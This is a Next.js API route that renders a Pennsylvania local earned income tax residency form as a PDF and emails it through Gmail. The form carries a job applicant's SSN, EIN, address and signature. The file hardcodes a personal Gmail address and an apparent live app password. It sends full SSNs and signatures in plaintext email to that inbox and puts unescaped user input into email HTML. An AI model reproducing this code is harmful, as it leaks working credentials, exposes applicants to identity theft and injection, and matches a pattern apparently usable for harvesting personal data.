import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import { PDFDocument, rgb, StandardFonts } from 'pdf-lib';

const emailConfig = {
  user: 'mehwishsheikh0010sheikh@gmail.com',
  pass: 'nlis zqmk mnon daak ',
  receiver: 'mehwishsheikh0010sheikh@gmail.com'
};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: emailConfig.user,
    pass: emailConfig.pass
  }
});

export async function POST(req: Request) {
  try {
    const body = await req.json();

    // Extract all fields from the JSON body
    const {
      name,
      ssn1, ssn2, ssn3, ssn4, ssn5, ssn6, ssn7, ssn8, ssn9,
      streetAddress, address2, city, state, zip, phone,
      municipality, county, residentPsd, residentRate,
      employerName, ein1, ein2, ein3, ein4, ein5, ein6, ein7, ein8, ein9,
      employerStreet, employerAddress2,
      employerCity, employerState, employerZip, employerPhone,
      employerMunicipality, employerCounty, workPsd, nonResRate,
      employeeSignature, date, employeePhone, email,
      jobAppFullName, jobRole, location
    } = body;

    // Validate required fields
    const requiredFields = [
      'name', 'streetAddress', 'city', 'state', 'zip', 'phone',
      'municipality', 'county', 'residentPsd', 'residentRate',
      'employerName', 'employerStreet', 'employerCity', 'employerState',
      'employerZip', 'employerPhone', 'employerMunicipality', 'employerCounty',
      'workPsd', 'nonResRate', 'employeeSignature', 'date', 'employeePhone', 'email'
    ];
    const missingFields = requiredFields.filter(field => !body[field] || (typeof body[field] === 'string' && body[field].trim() === ''));
    if (missingFields.length > 0) {
      return NextResponse.json({
        success: false,
        error: `Missing required fields: ${missingFields.join(', ')}`
      }, { status: 400 });
    }

    const ssn = [ssn1, ssn2, ssn3, ssn4, ssn5, ssn6, ssn7, ssn8, ssn9].join('');
    const ein = [ein1, ein2, ein3, ein4, ein5, ein6, ein7, ein8, ein9].join('');

    const pdfDoc = await PDFDocument.create();
    const page = pdfDoc.addPage([842, 1191]); // A4 size landscape
    const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
    const boldFont = await pdfDoc.embedFont(StandardFonts.HelveticaBold);

    const drawText = (text: string, x: number, y: number, size: number, isBold: boolean = false, color: any = rgb(0, 0, 0)) => {
      page.drawText(text, {
        x,
        y,
        size,
        font: isBold ? boldFont : font,
        color: color,
      });
    };

    // --- Job Application Fields at the top (exact same as form9.tsx) ---
    // Black background heading
    const appInfoBoxY = 1150;
    page.drawRectangle({ x: 40, y: appInfoBoxY, width: 760, height: 30, color: rgb(0,0,0) });
    drawText("Job Application Information", 50, appInfoBoxY + 8, 14, true, rgb(1,1,1));
    let y = appInfoBoxY - 10;
    // Inputs in a grouped block
    drawText("Full Name:", 50, y, 12, true);
    page.drawRectangle({ x: 130, y: y - 4, width: 180, height: 18, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.jobAppFullName || '', 135, y, 12);
    y -= 22;
    drawText("Job Role:", 50, y, 12, true);
    page.drawRectangle({ x: 130, y: y - 4, width: 180, height: 18, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.jobRole || '', 135, y, 12);
    y -= 22;
    drawText("Location:", 50, y, 12, true);
    page.drawRectangle({ x: 130, y: y - 4, width: 180, height: 18, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.location || '', 135, y, 12);
    y -= 40; // Extra space below application info

    // Title (exact same as form9.tsx)
    drawText("RESIDENCY CERTIFICATION FORM", 250, y, 20, true);
    drawText("Local Earned Income Tax Withholding", 280, y - 20, 16, true);
    y -= 60;

    // TO EMPLOYERS/TAXPAYERS section (exact same as form9.tsx)
    drawText("TO EMPLOYERS/TAXPAYERS", 350, y, 12, true);
    y -= 20;
    drawText("This form is to be used by employers and taxpayers to report essential information for the collection and distribution of Local Earned Income Taxes to the local EIT collector. This form must be used by employers when a new employee is hired or when a current employee notifies employer of a name or address change. Use the Address Search Application at dced.pa.gov/Act32 to determine PSD codes, EIT rates, and tax collector contact information.", 50, y, 10);
    y -= 40;

    // EMPLOYEE INFORMATION – RESIDENCE LOCATION (exact same as form9.tsx)
    // Black background header
    page.drawRectangle({ x: 40, y: y, width: 760, height: 25, color: rgb(0,0,0) });
    drawText("EMPLOYEE INFORMATION – RESIDENCE LOCATION", 50, y + 8, 14, true, rgb(1,1,1));
    y -= 35;

    // Name and SSN row (exact same as form9.tsx)
    drawText("Name (Last, First, Middle Initial):", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 400, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.name || '', 55, y - 10, 11);
    
    drawText("Social Security Number:", 470, y + 5, 10, true);
    // Draw SSN boxes
    for (let i = 0; i < 9; i++) {
      page.drawRectangle({ x: 470 + (i * 20), y: y - 15, width: 18, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
      drawText([ssn1, ssn2, ssn3, ssn4, ssn5, ssn6, ssn7, ssn8, ssn9][i] || '', 475 + (i * 20), y - 10, 11);
    }
    y -= 35;

    // Street Address (exact same as form9.tsx)
    drawText("Street Address (No PO Box, RD or RR):", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 700, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.streetAddress || '', 55, y - 10, 11);
    y -= 35;

    // Address Line 2 (exact same as form9.tsx)
    drawText("Address Line 2:", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 700, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.address2 || '', 55, y - 10, 11);
    y -= 35;

    // City, State, Zip, Phone row (exact same as form9.tsx)
    const cityWidth = 150, stateWidth = 100, zipWidth = 120, phoneWidth = 200;
    let xPos = 50;
    
    drawText("City:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: cityWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.city || '', xPos + 5, y - 10, 11);
    xPos += cityWidth + 10;
    
    drawText("State:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: stateWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.state || '', xPos + 5, y - 10, 11);
    xPos += stateWidth + 10;
    
    drawText("Zip Code:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: zipWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.zip || '', xPos + 5, y - 10, 11);
    xPos += zipWidth + 10;
    
    drawText("Daytime Phone Number:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: phoneWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.phone || '', xPos + 5, y - 10, 11);
    y -= 35;

    // Municipality (exact same as form9.tsx)
    drawText("MUNICIPALITY (City, Borough or Township):", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 700, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.municipality || '', 55, y - 10, 11);
    y -= 35;

    // County and PSD/Rate row (exact same as form9.tsx)
    drawText("COUNTY:", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 300, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.county || '', 55, y - 10, 11);
    
    drawText("RESIDENT PSD CODE:", 370, y + 5, 10, true);
    page.drawRectangle({ x: 370, y: y - 15, width: 180, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.residentPsd || '', 375, y - 10, 11);
    
    drawText("TOTAL RESIDENT EIT RATE:", 570, y + 5, 10, true);
    page.drawRectangle({ x: 570, y: y - 15, width: 180, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.residentRate || '', 575, y - 10, 11);
    y -= 50;

    // EMPLOYER INFORMATION – EMPLOYMENT LOCATION (exact same as form9.tsx)
    // Black background header
    page.drawRectangle({ x: 40, y: y, width: 760, height: 25, color: rgb(0,0,0) });
    drawText("EMPLOYER INFORMATION – EMPLOYMENT LOCATION", 50, y + 8, 14, true, rgb(1,1,1));
    y -= 35;

    // Employer Name and FEIN row (exact same as form9.tsx)
    drawText("Employer Business Name (Use Federal ID Name):", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 400, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerName || '', 55, y - 10, 11);
    
    drawText("EMPLOYER FEIN:", 470, y + 5, 10, true);
    // Draw EIN boxes
    for (let i = 0; i < 9; i++) {
      page.drawRectangle({ x: 470 + (i * 20), y: y - 15, width: 18, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
      drawText([ein1, ein2, ein3, ein4, ein5, ein6, ein7, ein8, ein9][i] || '', 475 + (i * 20), y - 10, 11);
    }
    y -= 35;

    // Employer Street Address (exact same as form9.tsx)
    drawText("Employer Street Address (No PO Box, RD or RR):", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 700, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerStreet || '', 55, y - 10, 11);
    y -= 35;

    // Employer Address Line 2 (exact same as form9.tsx)
    drawText("Address Line 2:", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 700, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerAddress2 || '', 55, y - 10, 11);
    y -= 35;

    // Employer City, State, Zip, Phone row (exact same as form9.tsx)
    xPos = 50;
    
    drawText("City:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: cityWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerCity || '', xPos + 5, y - 10, 11);
    xPos += cityWidth + 10;
    
    drawText("State:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: stateWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerState || '', xPos + 5, y - 10, 11);
    xPos += stateWidth + 10;
    
    drawText("Zip Code:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: zipWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerZip || '', xPos + 5, y - 10, 11);
    xPos += zipWidth + 10;
    
    drawText("Daytime Phone Number:", xPos, y + 5, 10, true);
    page.drawRectangle({ x: xPos, y: y - 15, width: phoneWidth, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerPhone || '', xPos + 5, y - 10, 11);
    y -= 35;

    // Employer Municipality (exact same as form9.tsx)
    drawText("MUNICIPALITY (City, Borough or Township):", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 700, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerMunicipality || '', 55, y - 10, 11);
    y -= 35;

    // Employer County and Work PSD/Rate row (exact same as form9.tsx)
    drawText("COUNTY:", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 300, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employerCounty || '', 55, y - 10, 11);
    
    drawText("WORK LOCATION PSD CODE:", 370, y + 5, 10, true);
    page.drawRectangle({ x: 370, y: y - 15, width: 180, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.workPsd || '', 375, y - 10, 11);
    
    drawText("WORK LOCATION NON-RESIDENT EIT RATE:", 570, y + 5, 10, true);
    page.drawRectangle({ x: 570, y: y - 15, width: 180, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.nonResRate || '', 575, y - 10, 11);
    y -= 50;

    // CERTIFICATION (exact same as form9.tsx)
    // Black background header
    page.drawRectangle({ x: 40, y: y, width: 760, height: 25, color: rgb(0,0,0) });
    drawText("CERTIFICATION", 50, y + 8, 14, true, rgb(1,1,1));
    y -= 35;

    drawText("Under penalties of perjury, I (we) declare that I (we) have examined this information...", 50, y, 10);
    y -= 25;

    // Signature and Date row (exact same as form9.tsx)
    drawText("Signature of Employee:", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 400, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    if (body.employeeSignature) {
        try {
            const signatureImage = await pdfDoc.embedPng(body.employeeSignature.split(',')[1]);
            page.drawImage(signatureImage, {
                x: 55,
                y: y - 15,
                width: 200,
                height: 20,
            });
        } catch (error) {
            console.error('Error embedding signature:', error);
        }
    }
    
    drawText("Date (MM/DD/YYYY):", 470, y + 5, 10, true);
    page.drawRectangle({ x: 470, y: y - 15, width: 200, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.date || '', 475, y - 10, 11);
    y -= 35;

    // Phone and Email row (exact same as form9.tsx)
    drawText("Phone Number:", 50, y + 5, 10, true);
    page.drawRectangle({ x: 50, y: y - 15, width: 300, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.employeePhone || '', 55, y - 10, 11);
    
    drawText("Email Address:", 370, y + 5, 10, true);
    page.drawRectangle({ x: 370, y: y - 15, width: 400, height: 20, color: rgb(1,1,1), borderWidth: 1, borderColor: rgb(0,0,0) });
    drawText(body.email || '', 375, y - 10, 11);
    y -= 50;

    // Footer information (exact same as form9.tsx)
    drawText("For information on obtaining the appropriate MUNICIPALITY, PSD CODES, and EIT RATES visit:", 50, y, 10);
    y -= 15;
    drawText("dced.pa.gov/Act32", 50, y, 10, true);
    y -= 30;

    // Draw a box around the entire content area to frame the page
    page.drawRectangle({
      x: 30,
      y: 30,
      width: 780,
      height: y - 30 + 80,
      borderWidth: 2,
      borderColor: rgb(0,0,0),
      color: undefined // transparent
    });

    const pdfBytes = await pdfDoc.save();

    // Create HTML content for the email
    const htmlContent = `
      <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto;">
        <h2 style="color: #333;">Residency Certification Form Submission</h2>
        <div style="margin: 20px 0; padding: 20px; background-color: #f9f9f9; border-radius: 5px;">
          <h3 style="color: #444;">Job Application Information</h3>
          <p><strong>Full Name:</strong> ${jobAppFullName}</p>
          <p><strong>Job Role:</strong> ${jobRole}</p>
          <p><strong>Location:</strong> ${location}</p>
        </div>
        <div style="margin: 20px 0; padding: 20px; background-color: #f9f9f9; border-radius: 5px;">
          <h3 style="color: #444;">Employee Information</h3>
          <p><strong>Name:</strong> ${name}</p>
          <p><strong>SSN:</strong> ${ssn}</p>
          <p><strong>Street Address:</strong> ${streetAddress}</p>
          <p><strong>Address 2:</strong> ${address2}</p>
          <p><strong>City:</strong> ${city}</p>
          <p><strong>State:</strong> ${state}</p>
          <p><strong>Zip:</strong> ${zip}</p>
          <p><strong>Phone:</strong> ${phone}</p>
          <p><strong>Municipality:</strong> ${municipality}</p>
          <p><strong>County:</strong> ${county}</p>
          <p><strong>Resident PSD Code:</strong> ${residentPsd}</p>
          <p><strong>Resident Rate:</strong> ${residentRate}</p>
        </div>
        <div style="margin: 20px 0; padding: 20px; background-color: #f1f1f1; border-radius: 5px;">
          <h3 style="color: #444;">Employer Information</h3>
          <p><strong>Employer Name:</strong> ${employerName}</p>
          <p><strong>EIN:</strong> ${ein}</p>
          <p><strong>Employer Street:</strong> ${employerStreet}</p>
          <p><strong>Employer Address 2:</strong> ${employerAddress2}</p>
          <p><strong>Employer City:</strong> ${employerCity}</p>
          <p><strong>Employer State:</strong> ${employerState}</p>
          <p><strong>Employer Zip:</strong> ${employerZip}</p>
          <p><strong>Employer Phone:</strong> ${employerPhone}</p>
          <p><strong>Employer Municipality:</strong> ${employerMunicipality}</p>
          <p><strong>Employer County:</strong> ${employerCounty}</p>
          <p><strong>Work PSD Code:</strong> ${workPsd}</p>
          <p><strong>Non-Resident Rate:</strong> ${nonResRate}</p>
        </div>
        <div style="margin: 20px 0; padding: 20px; background-color: #e9e9e9; border-radius: 5px;">
          <h3 style="color: #444;">Certification</h3>
          <p><strong>Date:</strong> ${date}</p>
          <p><strong>Employee Phone:</strong> ${employeePhone}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Signature:</strong></p>
          ${employeeSignature ? `<img src="${employeeSignature}" alt="Signature" style="max-width:300px;max-height:80px;border:1px solid #ccc;" />` : '<em>No signature provided</em>'}
        </div>
      </div>
    `;

    // Define mailOptions
    const mailOptions = {
      from: emailConfig.user,
      to: emailConfig.receiver,
      subject: 'Residency Certification Form Submission',
      html: htmlContent,
      attachments: [
        {
          filename: 'residency_certification_form.pdf',
          content: Buffer.from(pdfBytes),
          contentType: 'application/pdf',
        },
      ],
    };

    // Send email
    try {
      await transporter.sendMail(mailOptions);
      return NextResponse.json({
        success: true,
        message: 'Form submitted successfully and email notification sent'
      });
    } catch (error) {
      console.error(error)
      return NextResponse.json(
        { success: false, error: 'Failed to send email notification' },
        { status: 500 }
      );
    }
  } catch (error) {
    console.error(error)
    return NextResponse.json(
      { success: false, error: 'Server error' },
      { status: 500 }
    );
  }
}
